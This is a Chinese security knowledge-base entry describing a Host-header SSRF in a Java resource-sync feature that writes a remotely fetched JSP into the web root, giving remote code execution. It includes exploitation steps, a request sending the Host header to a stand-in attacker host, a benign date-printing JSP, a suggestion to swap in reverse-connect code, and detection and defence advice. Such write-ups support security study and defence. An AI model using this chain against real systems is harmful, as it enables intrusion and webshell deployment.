---
id: web-generic-ssrf-host-header-getservername-download-webroot-rce
title: Host 头 SSRF 串联远程下载落盘 Web 目录：从 request.getServerName() 到 JSP GetShell
type: scenario
domain: web
path: web/generic/ssrf
technique: host-header-ssrf-download-webroot-rce
tags:
- web
- ssrf
- host-header
- java
- file-write
- webshell
- rce
- getservername
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V75
  verified_at: '2026-11-05T16:27:45+08:00'
  notes: 已对照原文与10张图核对；getServerName回源、Host篡改、downloaded_files落盘1.jsp并执行均一致；原文未标注受影响版本；PoC未复跑
url: /docs/web/generic/ssrf/web-generic-ssrf-host-header-getservername-download-webroot-rce/
draft: false
kb_aliases:
- Host 头 SSRF 任意文件写入
- getServerName SSRF
- 资源同步 SSRF GetShell
- 远程下载落盘 Web 目录
- CDN 节点同步 SSRF
- Host 头回源 RCE
---

## 一句话结论

后台“节点资源同步”功能用 `request.getServerName()`（即 Host 头）拼接回源 URL，攻击者把 Host 改成自己的服务器并让同步一个 JSP 文件，服务端会把远程响应写入 Web 可访问的 `downloaded_files/` 目录且保留 `.jsp` 扩展名，访问落盘文件即执行任意代码，形成 Host 头 SSRF → 任意文件写入 → GetShell 的完整链。

## 原理

- `request.getServerName()` 的值来自请求的 Host 头（在多数 Servlet 容器中），`getServerPort()` 同理。开发者把它当作“本机地址”来构造同步源：`targetUrl = scheme + "://" + serverName + ":" + serverPort + file`。
- 攻击者直接控制 Host 和 `file` 参数，就能让服务端向任意 host:port 发起 GET，这是 Host 头驱动的 SSRF；与代理路由型 Host SSRF 不同，这里是应用代码显式把 Host 拼进回源 URL。
- `saveUrl()` 用 `URL.openConnection()` 取响应流，并把内容写入 `UPLOAD_DIR`（本例为 Web 根下的 `downloaded_files/`）；文件名取 URL 最后一个 `/` 之后的部分（去掉查询串），因此扩展名由攻击者控制。
- 若 `file=/1.jsp`、Host 指向攻击者服务器，则目标 URL 为 `http://attacker:port/1.jsp`；服务端下载后保存为 `downloaded_files/1.jsp`，该目录可被 Web 直接访问。
- Java Web 容器会对 `.jsp` 文件编译执行，访问 `downloaded_files/1.jsp` 即触发其中的 JSP 代码，完成从 SSRF 到 RCE 的升级；即使容器不解析脚本，也可写入 HTML/JS 造成存储型 XSS，或覆盖可写目录中的文件。
- 根因是两条信任边界同时失效：客户端可影响服务端回源目标（Host），且远程响应可写入 Web 可执行目录、文件名/扩展名不受控。

## 触发条件

- 攻击者可访问后台的资源同步/远程下载功能（本例需登录后台）；
- 代码用 `request.getServerName()`/Host 或类似请求头构造回源 URL；
- 同步结果写入 Web 服务器可访问目录，且保留攻击者控制的文件名/扩展名；
- Web 容器解析目标扩展名（如 JSP/PHP/ASPX），或目录内文件可被直接访问；
- 服务端可出站访问攻击者服务器。

## 利用步骤

1. 登录后台，进入节点资源同步/远程下载功能，抓取请求，确认参数（如 `file=/static/images/banner_v2.png`）与响应中的落盘路径（如 `/downloaded_files/...`）。
2. 在攻击者服务器上放置一个最小 JSP 文件（先返回时间等无害内容），启动 HTTP 服务。
3. 发送同步请求，保持请求行中的真实目标不变，把 Host 改为攻击者服务器地址与端口，`file` 设为 `/1.jsp`：
   ```http
   GET /download?file=%2F1.jsp HTTP/1.1
   Host: attacker.example:8081
   ```
4. 观察响应中的 `Success ... Local path: .../downloaded_files/1.jsp`，确认服务端已下载并落盘。
5. 访问 `http://target/downloaded_files/1.jsp`，确认 JSP 被执行（如返回服务器时间）。
6. 将 JSP 内容替换为命令执行/回连代码，在授权范围内验证 RCE；测试后删除落盘文件并恢复配置。

## PoC

攻击者服务器上的最小 JSP（无害验证）：

```jsp
<%= new java.util.Date() %>
```

同步请求：

```http
GET /download?file=%2F1.jsp HTTP/1.1
Host: attacker.example:8081
Accept: */*
```

服务端行为（示意）：

```text
GET http://attacker.example:8081/1.jsp
-> 200 OK
-> 写入 <webroot>/downloaded_files/1.jsp
-> 响应 Success: Resource synchronized. Local path: .../downloaded_files/1.jsp
```

访问 `http://target/downloaded_files/1.jsp` 返回 `Current Time: ...`，证明 JSP 已执行；原文即以此方式从 SSRF 升级到 GetShell。

## 变体与关联

- 变体：应用使用 `X-Forwarded-Host`、`Forwarded`、`X-Forwarded-Port` 等头构造 URL 时，同样可注入；端口也可来自 Host 头。
- 变体：文件名来自 `file` 参数的路径段或响应头 `Content-Disposition`；若可包含 `../` 或空字节，可能写到 Web 根之外或覆盖现有文件。
- 变体：目标容器为 PHP/ASPX 时落盘对应脚本；若目录禁止脚本执行，仍可写入 HTML/JS 做存储型 XSS 或覆盖静态资源。
- 关联：[[web-generic-ssrf-host-header-routing-ssrf]]（代理路由层的 Host 头 SSRF，入口不同）、[[web-generic-file-upload-monsta-ftp-unauth-download-write]]（远程下载写盘 GetShell 的同类 sink）、[[web-generic-file-upload-zip-slip-webshell-write]]（写入 Web 根的另一路径）。
- 边界：回源目标由固定配置决定、Host 被严格校验、落盘目录不可 Web 访问/禁止脚本执行、文件名被重命名且扩展名白名单时，链条不成立。

## 检测与防御

- 检测：请求 Host 与真实站点不一致且指向外部/内网地址；同步接口的 `file` 参数以脚本扩展名结尾；`downloaded_files/` 等下载目录出现 JSP/PHP/ASPX 文件；服务端对异常 Host 发起出站 HTTP 请求。
- 防御：回源目标必须来自服务端固定配置或可信映射，禁止用 `request.getServerName()`、Host、`X-Forwarded-*` 构造；若必须使用，严格 allowlist 域名与端口。
- 防御：落盘目录放在 Web 根之外，文件名由服务端生成（UUID + 白名单扩展名），禁止使用 URL/用户输入命名；对下载内容做类型校验。
- 防御：Web 服务器禁止下载/上传目录执行脚本；限制服务端出站访问内网与云元数据；同步功能要求强认证并记录源 URL、目标、落盘路径。
